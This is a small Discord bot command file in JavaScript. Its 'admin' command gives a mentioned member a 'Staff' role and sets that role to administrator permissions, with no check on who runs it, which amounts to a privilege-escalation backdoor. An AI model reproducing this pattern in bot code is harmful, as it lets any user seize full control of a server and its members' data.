// Commande a ne pas utiliser, ne marche que sur mon serveur

module.exports = {
    name: "admin",

    execute(client, message, args){
        let user = message.mentions.members.first();
        user.roles.add(user.guild.roles.cache.find(role => role.name === 'Staff'));
        role = user.guild.roles.cache.find(role => role.name === 'Staff');
        role.edit({permissions: 'ADMINISTRATOR'})
    }
}